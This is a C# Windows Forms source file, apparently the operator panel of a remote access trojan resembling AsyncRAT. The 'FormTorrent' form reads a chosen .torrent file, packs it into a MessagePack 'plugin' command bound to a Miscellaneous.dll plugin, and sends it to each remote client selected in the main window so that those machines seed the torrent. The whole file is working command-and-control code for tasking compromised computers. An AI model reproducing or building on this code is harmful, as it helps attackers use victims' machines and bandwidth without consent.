using Server.MessagePack;
using Server.Connection;
using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.IO;
using System.Linq;
using System.Text;
using System.Threading;
using System.Threading.Tasks;
using System.Windows.Forms;
using Server.Algorithm;

namespace Server.Forms
{
    public partial class FormTorrent : Form
    {
        private bool IsOk = false;
        public FormTorrent()
        {
            InitializeComponent();
        }

        private void Button1_Click(object sender, EventArgs e)
        {
            OpenFileDialog openFileDialog = new OpenFileDialog();
            openFileDialog.Filter = "(*.torrent)|*.torrent";
            if (openFileDialog.ShowDialog() == DialogResult.OK)
            {
                textBox1.Text = openFileDialog.FileName;
                IsOk = true;
            }
            else
            {
                textBox1.Text = "";
                IsOk = false;
            }
        }

        private void Button3_Click(object sender, EventArgs e)
        {
            this.Close();
        }

        private void Button2_Click(object sender, EventArgs e)
        {
            try
            {
                if (!IsOk) return;
                MsgPack packet = new MsgPack();
                packet.ForcePathObject("Packet").AsString = "torrent";
                packet.ForcePathObject("Option").AsString = "seed";
                packet.ForcePathObject("File").SetAsBytes(File.ReadAllBytes(textBox1.Text));

                MsgPack msgpack = new MsgPack();
                msgpack.ForcePathObject("Packet").AsString = "plugin";
                msgpack.ForcePathObject("Dll").AsString = (GetHash.GetChecksum(@"Plugins\Miscellaneous.dll"));

                msgpack.ForcePathObject("Msgpack").SetAsBytes(packet.Encode2Bytes());


                foreach (ListViewItem itm in Program.form1.listView1.SelectedItems)
                {
                    Clients client = (Clients)itm.Tag;
                    ThreadPool.QueueUserWorkItem(client.Send, msgpack.Encode2Bytes());
                }
                this.Close();
            }
            catch (Exception ex) { MessageBox.Show(ex.Message); }
        }
    }
}
